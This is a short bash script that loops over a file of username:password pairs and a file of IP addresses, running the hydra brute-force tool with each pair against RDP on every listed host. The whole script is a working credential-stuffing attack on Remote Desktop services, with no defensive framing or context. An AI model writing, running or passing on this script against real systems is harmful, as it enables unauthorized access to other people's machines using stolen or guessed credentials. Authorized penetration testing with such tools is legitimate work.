#!/bin/bash
while read comboraw || [[ $comboraw ]]; do
    combo="$(echo $comboraw | sed -e 's/\r//g')"
    username=$(echo $combo | cut -d: -f1)
    password=$(echo $combo | cut -d: -f2-)
    while read ipraw || [[ $ipraw ]]; do
        ip="$(echo $ipraw | sed -e 's/\r//g')"
        # echo $username -- $password -- $ip
        sudo hydra -t4 -V -f -l $username -p $password rdp://$ip
    done < "$2"
done < "$1"



